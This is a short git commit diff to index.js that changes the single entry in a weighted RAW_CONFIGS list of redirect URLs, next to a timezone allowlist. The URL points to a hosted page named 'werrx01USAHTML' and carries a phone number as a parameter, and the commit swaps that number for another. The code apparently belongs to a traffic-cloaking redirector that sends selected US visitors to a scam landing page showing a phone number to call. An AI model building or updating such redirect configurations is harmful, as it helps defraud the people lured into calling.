4acf838419c6248ca9146253e856ff5d5bba9e67
paalakash <palaksh452@gmail.com>
2026-06-03 04:56:41 +0530

    Update RAW_CONFIGS URLs in index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://seahorse-app-upc54.ondigitalocean.app/werrx01USAHTML/?bcda=1800 730 278", weight: 1.0 }
+    { url: "https://seahorse-app-upc54.ondigitalocean.app/werrx01USAHTML/?bcda=1800 209 169", weight: 1.0 }
 
 ];
 
